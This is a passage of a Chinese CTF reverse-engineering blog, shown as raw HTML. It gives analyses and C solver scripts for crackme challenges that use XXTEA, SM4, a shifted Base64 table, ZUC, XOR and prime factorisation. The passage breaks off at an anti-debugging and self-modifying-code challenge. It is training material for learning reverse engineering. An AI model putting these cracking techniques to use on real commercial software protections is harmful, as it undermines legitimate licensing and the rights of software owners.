class="line">            xxtea_y = xxtea_origin[<span class="number">0</span>];</span><br><span class="line">            xxtea_z = xxtea_origin[xxtea_n - <span class="number">1</span>] += xxtea_MX;</span><br><span class="line">        } <span class="keyword">while</span> (--xxtea_rounds);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (xxtea_n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    {</span><br><span class="line">        xxtea_n = -xxtea_n;</span><br><span class="line">        xxtea_rounds = <span class="number">6</span> + <span class="number">52</span> / xxtea_n;</span><br><span class="line">        xxtea_sum = xxtea_rounds * xxtea_DELTA;</span><br><span class="line">        xxtea_y = xxtea_origin[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">            xxtea_e = (xxtea_sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (xxtea_p = xxtea_n - <span class="number">1</span>; xxtea_p &gt; <span class="number">0</span>; xxtea_p--)</span><br><span class="line">            {</span><br><span class="line">                xxtea_z = xxtea_origin[xxtea_p - <span class="number">1</span>];</span><br><span class="line">                xxtea_y = xxtea_origin[xxtea_p] -= xxtea_MX;</span><br><span class="line">            }</span><br><span class="line">            xxtea_z = xxtea_origin[xxtea_n - <span class="number">1</span>];</span><br><span class="line">            xxtea_y = xxtea_origin[<span class="number">0</span>] -= xxtea_MX;</span><br><span class="line">            xxtea_sum -= xxtea_DELTA;</span><br><span class="line">        } <span class="keyword">while</span> (--xxtea_rounds);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">//0x40CEA5BC,0xE7B2B2F4,0x129D12A9,0x5BC810AE,0x1D06D73D,0xDCF800DC</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc[<span class="number">6</span>] = { <span class="number">0x40CEA5BC</span>,<span class="number">0xE7B2B2F4</span>,<span class="number">0x129D12A9</span>,<span class="number">0x5BC810AE</span>,<span class="number">0x1D06D73D</span>,<span class="number">0xDCF870DC</span> };</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>] = { (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">0x67616c66</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">0x0</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">0x0</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">0x0</span> };</span><br><span class="line">    xxtea(enc, <span class="number">-6</span>, key);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>,((<span class="keyword">char</span>*)&amp;enc[i])[<span class="number">0</span>], ((<span class="keyword">char</span>*)&amp;enc[i])[<span class="number">1</span>], ((<span class="keyword">char</span>*)&amp;enc[i])[<span class="number">2</span>], ((<span class="keyword">char</span>*)&amp;enc[i])[<span class="number">3</span>]);</span><br><span class="line">    }<span class="comment">//强制转为char然后依次取出，这样就不会逆序了</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>异或和位置互换</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> data[<span class="number">24</span>] = {</span><br><span class="line"><span class="number">0xCE</span>, <span class="number">0xBC</span>, <span class="number">0x40</span>, <span class="number">0x6B</span>, <span class="number">0x7C</span>, <span class="number">0x3A</span>, <span class="number">0x95</span>, <span class="number">0xC0</span>, <span class="number">0xEF</span>, <span class="number">0x9B</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x91</span>, <span class="number">0xF7</span>, <span class="number">0x02</span>, <span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0xC8</span>, <span class="number">0xE7</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0xFA</span></span><br><span class="line">};</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">23</span>; i &gt;= <span class="number">0</span>; --i)<span class="comment">//因为最后的加密数据和前面的有关系，所以要从前往后</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">6</span> - count; j &gt;= <span class="number">0</span>; --j)<span class="comment">//并且分为了多轮，除去前三个不需要异或，剩下7组，又是小于8，所以从下标为6开始</span></span><br><span class="line">{</span><br><span class="line">data[i] ^= data[j];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">count++;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">char</span> encode_flag2[<span class="number">24</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="comment">//交换还原</span></span><br><span class="line">encode_flag2[<span class="number">2</span>]= *data;</span><br><span class="line">*encode_flag2= data[<span class="number">1</span>];</span><br><span class="line">encode_flag2[<span class="number">3</span>]= data[<span class="number">2</span>];</span><br><span class="line">encode_flag2[<span class="number">1</span>]= data[<span class="number">3</span>];</span><br><span class="line">encode_flag2[<span class="number">6</span>]= data[<span class="number">4</span>];</span><br><span class="line">encode_flag2[<span class="number">4</span>]= data[<span class="number">5</span>];</span><br><span class="line">encode_flag2[<span class="number">7</span>]= data[<span class="number">6</span>];</span><br><span class="line">encode_flag2[<span class="number">5</span>]= data[<span class="number">7</span>];</span><br><span class="line">encode_flag2[<span class="number">10</span>]= data[<span class="number">8</span>];</span><br><span class="line">encode_flag2[<span class="number">8</span>]= data[<span class="number">9</span>];</span><br><span class="line">encode_flag2[<span class="number">11</span>]= data[<span class="number">10</span>];</span><br><span class="line">encode_flag2[<span class="number">9</span>]= data[<span class="number">11</span>];</span><br><span class="line">encode_flag2[<span class="number">14</span>]= data[<span class="number">12</span>];</span><br><span class="line">encode_flag2[<span class="number">12</span>]= data[<span class="number">13</span>];</span><br><span class="line">encode_flag2[<span class="number">15</span>]= data[<span class="number">14</span>];</span><br><span class="line">encode_flag2[<span class="number">13</span>]= data[<span class="number">15</span>];</span><br><span class="line">encode_flag2[<span class="number">18</span>]= data[<span class="number">16</span>];</span><br><span class="line">encode_flag2[<span class="number">16</span>]= data[<span class="number">17</span>];</span><br><span class="line">encode_flag2[<span class="number">19</span>]= data[<span class="number">18</span>];</span><br><span class="line">encode_flag2[<span class="number">17</span>]= data[<span class="number">19</span>];</span><br><span class="line">encode_flag2[<span class="number">22</span>]= data[<span class="number">20</span>];</span><br><span class="line">encode_flag2[<span class="number">20</span>]=data[<span class="number">21</span>] ;</span><br><span class="line">encode_flag2[<span class="number">23</span>]= data[<span class="number">22</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; ++i)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%X,"</span>, encode_flag2[i]&amp;<span class="number">0xff</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="安洵杯-2019-crackMe"><a class="header-anchor" href="#安洵杯-2019-crackMe">¶</a>[安洵杯 2019]crackMe</h1><h2 id="考点-v2"><a class="header-anchor" href="#考点-v2">¶</a>考点</h2><p>SM4、Base64变表加密、换位</p><h2 id="分析-v2"><a class="header-anchor" href="#分析-v2">¶</a>分析</h2><p>这里我和别人不一样，我运行不了程序，所以没办法动调，只能X查看交叉引用</p><p>进去定位到主加密函数</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333197817.png" alt></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333231195.png" alt></p><h3 id="初始化密钥"><a class="header-anchor" href="#初始化密钥">¶</a>初始化密钥</h3><p>对key查看交叉引用，可以进入这里，看一下对赋值后的字符串处理</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333257430.png" alt></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333345804.png" alt></p><p>通过FindCrypt可以知道是SM4加密，所以这一段就是初始化密钥了</p><h3 id="SM4加密"><a class="header-anchor" href="#SM4加密">¶</a>SM4加密</h3><p>回到encode函数</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333436418.png" alt></p><p>可以发现最后将加密后的字符串给到了final</p><h3 id="Base64加密"><a class="header-anchor" href="#Base64加密">¶</a>Base64加密</h3><p>对final查看交叉引用，发现对其进行了加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333588664.png" alt></p><p>这里解释一下一些东西</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333635363.png" alt></p><blockquote><p><strong>我们base64就是将三个字符也就是24位转为4个6位，做索引，这里使用移位直接将三个字符成为一个int型，也就是每个左移8位，而待会取出的时候右移六位即可取出，实现了8位与6位的转换，比较有意思</strong></p></blockquote><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333792600.png" alt></p><p>在红框函数中将传入的6位索引进行+24，也就是(index+24)%64，我们可以将base64表整体左移，就相当于index+24了</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333896782.png" alt></p><p>再对base64表查看交叉引用，发现了将大小写转换</p><h3 id="换位"><a class="header-anchor" href="#换位">¶</a>换位</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333519884.png" alt></p><p>可以看到这里将最后用来对比的字符串每两个字符进行互换</p><h2 id="脚本-v2"><a class="header-anchor" href="#脚本-v2">¶</a>脚本</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> base64_table[] = <span class="string">"yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx"</span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">base64_encode</span><span class="params">(<span class="keyword">char</span> code[], <span class="keyword">char</span> str[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> code_len = <span class="built_in">strlen</span>(code);</span><br><span class="line"><span class="keyword">int</span> str_len ;</span><br><span class="line"><span class="keyword">if</span> (code_len%<span class="number">3</span>)</span><br><span class="line">{</span><br><span class="line">str_len = (code_len / <span class="number">3</span> + <span class="number">1</span> ) * <span class="number">4</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">str_len = (code_len / <span class="number">3</span>) * <span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, i_ = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (; i &lt; code_len; i += <span class="number">3</span>, i_ += <span class="number">4</span>)</span><br><span class="line">{</span><br><span class="line">str[i_] = base64_table[code[i]&gt;&gt; <span class="number">2</span>];</span><br><span class="line">str[i_ + <span class="number">1</span>] = base64_table[((code[i] &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">4</span>) | ((code[i + <span class="number">1</span>] &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">str[i_ + <span class="number">2</span>] = base64_table[((code[i+<span class="number">1</span>] &amp; <span class="number">0x0f</span>) &lt;&lt; <span class="number">2</span>) | ((code[i + <span class="number">2</span>] &amp; <span class="number">0xc0</span>) &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">str[i_ + <span class="number">3</span>] = base64_table[(code[i + <span class="number">2</span>] &amp; <span class="number">0x3f</span>)];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (code_len % <span class="number">3</span> == <span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line">str[i_<span class="number">-1</span>] = <span class="string">'='</span>;</span><br><span class="line">str[i_ - <span class="number">2</span>] = <span class="string">'='</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (code_len % <span class="number">3</span> == <span class="number">2</span>)</span><br><span class="line">{</span><br><span class="line">str[i_<span class="number">-1</span>] = <span class="string">'='</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findIndex</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">char</span> b64_table[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (c == b64_table[i])</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">int</span> str_len;</span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">base64_decode</span><span class="params">(<span class="keyword">char</span> code[], <span class="keyword">char</span> str[], <span class="keyword">char</span> b64_table[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">char</span> memstr[<span class="number">200</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="built_in">memcpy</span>(memstr, code, <span class="built_in">strlen</span>(code));</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(code);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(code, <span class="string">"=="</span>))</span><br><span class="line">str_len = len / <span class="number">4</span> * <span class="number">3</span> - <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strstr</span>(code, <span class="string">"="</span>))</span><br><span class="line">str_len = len / <span class="number">4</span> * <span class="number">3</span> - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">str_len = len / <span class="number">4</span> * <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, i_ = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>, i_ += <span class="number">3</span>)</span><br><span class="line">{</span><br><span class="line">str[i_] = (findIndex(memstr[i], b64_table) &lt;&lt; <span class="number">2</span>) | (findIndex(memstr[i + <span class="number">1</span>], b64_table) &amp; <span class="number">0x30</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">str[i_+<span class="number">1</span>]= (findIndex(memstr[i+<span class="number">1</span>], b64_table)&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">4</span> | (findIndex(memstr[i + <span class="number">2</span>], b64_table) &amp; <span class="number">0x3c</span>) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">str[i_ + <span class="number">2</span>] = (findIndex(memstr[i + <span class="number">2</span>], b64_table) &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">6</span> | (findIndex(memstr[i + <span class="number">3</span>], b64_table));</span><br><span class="line">}</span><br><span class="line">str[str_len] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">char</span> code[<span class="number">100</span>] = <span class="string">"1UTAOIkpyOSWGv/mOYFY4R=="</span>;</span><br><span class="line"><span class="keyword">char</span> decode[<span class="number">100</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="keyword">char</span> encode[<span class="number">100</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="comment">//两位交换</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(code); i += <span class="number">2</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">char</span> v2 = code[i];</span><br><span class="line">code[i] = code[i + <span class="number">1</span>];</span><br><span class="line">code[i + <span class="number">1</span>] = v2;                         <span class="comment">// 每两个之间进行交换</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*base64_encode(code, encode); </span></span><br><span class="line"><span class="comment">printf("%s\n", encode);*/</span></span><br><span class="line">base64_decode(code, decode,base64_table);</span><br><span class="line"><span class="keyword">if</span> (decode == <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str_len; ++i)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X"</span>, decode[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>得到59D095290DF2400614F48D276906874E</p><p>SM4解密</p><p><a href="https://the-x.cn/cryptography/Sm4.aspx">https://the-x.cn/cryptography/Sm4.aspx</a></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650334038696.png" alt></p><h1 id="SWPU2019-ReverseMe"><a class="header-anchor" href="#SWPU2019-ReverseMe">¶</a>[SWPU2019]ReverseMe</h1><h2 id="考点-v3"><a class="header-anchor" href="#考点-v3">¶</a>考点</h2><p>异或、ZUC算法</p><h2 id="分析-v3"><a class="header-anchor" href="#分析-v3">¶</a>分析</h2><p>先异或SWPU_2019_CTF，再异或ZUC算法生成的数据</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350768675.png" alt="异或"></p><p>ZUC算法生成异或的值</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350800049.png" alt></p><p>unsigned int 的异或，通过动调也可以知道</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350725823.png" alt="xor"></p><h2 id="脚本-v3"><a class="header-anchor" href="#脚本-v3">¶</a>脚本</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> data[<span class="number">8</span>] = {</span><br><span class="line"><span class="number">0xCA3E0C86</span>, <span class="number">0x19AED798</span>, <span class="number">0xA66B77E2</span>, <span class="number">0xB077A16A</span>, <span class="number">0x05379169</span>, <span class="number">0x307BF97A</span>, <span class="number">0x104B5A43</span>, <span class="number">0x28D47D86</span></span><br><span class="line">};</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="keyword">final</span>[<span class="number">8</span>] = {</span><br><span class="line"><span class="number">0xF80F37B3</span>, <span class="number">0x5DAEBCBC</span>, <span class="number">0x864D5ABA</span>, <span class="number">0xD3629744</span>, <span class="number">0x1624BA4F</span>, <span class="number">0x1A729F0B</span>, <span class="number">0x266D6865</span>, <span class="number">0x67C86BBA</span></span><br><span class="line">};</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> k[] = { <span class="number">0</span> };</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">final</span>[i] ^= data[i];</span><br><span class="line">k[j++] = ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">0</span>];</span><br><span class="line">k[j++] = ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">1</span>];</span><br><span class="line">k[j++] = ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">2</span>];</span><br><span class="line">k[j++] = ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">3</span>];</span><br><span class="line">}</span><br><span class="line">k[j] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> key[] = <span class="string">"SWPU_2019_CTF"</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">{</span><br><span class="line">k[i] ^= key[i % <span class="number">13</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, k[i]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="MRCTF2020-EasyCpp"><a class="header-anchor" href="#MRCTF2020-EasyCpp">¶</a>[MRCTF2020]EasyCpp</h1><h2 id="考点-v4"><a class="header-anchor" href="#考点-v4">¶</a>考点</h2><p>异或、替换，素因数分解</p><h2 id="分析-v4"><a class="header-anchor" href="#分析-v4">¶</a>分析</h2><p>一些关键的都已经标识出来了</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331362066.png" alt></p><h3 id="读取输入"><a class="header-anchor" href="#读取输入">¶</a>读取输入</h3><p>读取9次key，并且拼接起来</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331630377.png" alt></p><h3 id="异或-v2"><a class="header-anchor" href="#异或-v2">¶</a>异或</h3><p>这里面是和1异或</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331969448.png" alt></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331929652.png" alt></p><h3 id="素因数分解"><a class="header-anchor" href="#素因数分解">¶</a>素因数分解</h3><p>这里只要能整除i，就重新进入递归，参数为整除i后的数，如果i遍历完不符合，结束循环，然后拼接上空格</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332066496.png" alt></p><h3 id="替换"><a class="header-anchor" href="#替换">¶</a>替换</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332316391.png" alt></p><p>将数字换成字母，空格换为=</p><h3 id="比较"><a class="header-anchor" href="#比较">¶</a>比较</h3><p>红框数组存储的是最后比较的字符串</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332398066.png" alt></p><h2 id="脚本-v4"><a class="header-anchor" href="#脚本-v4">¶</a>脚本</h2><p>这里我直接手动替换算出来的</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">293</span> * <span class="number">8</span>) ^ <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">1223</span>) ^ <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">11</span> * <span class="number">7</span> * <span class="number">5</span> * <span class="number">5</span> * <span class="number">3</span>) ^ <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">2477</span>) ^ <span class="number">1</span>); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">125</span> * <span class="number">27</span>) ^ <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">3</span> * <span class="number">3011</span>) ^ <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">13</span> * <span class="number">7</span> * <span class="number">27</span>) ^ <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">353</span> * <span class="number">5</span> * <span class="number">2</span>) ^ <span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure><p>md5即可</p><h1 id="SCTF2019-Creakme"><a class="header-anchor" href="#SCTF2019-Creakme">¶</a>SCTF2019-Creakme</h1><h2 id="考点-v5"><a class="header-anchor" href="#考点-v5">¶</a>考点</h2><p>AES-CBC加密、Base64加密、反调试、SMC</p><h2 id="分析-v5"><a class="header-anchor" href="#分析-v5">¶</a>分析</h2><h3 id="反调试、SMC"><a class="header-anchor" href="#反调试、SMC">¶</a>反调试、SMC</h3><p>一看到这种遍历段名称的操作，熟悉SMC自解密的应该知道这是敏感的操作，也就是解密操作</p><p><img 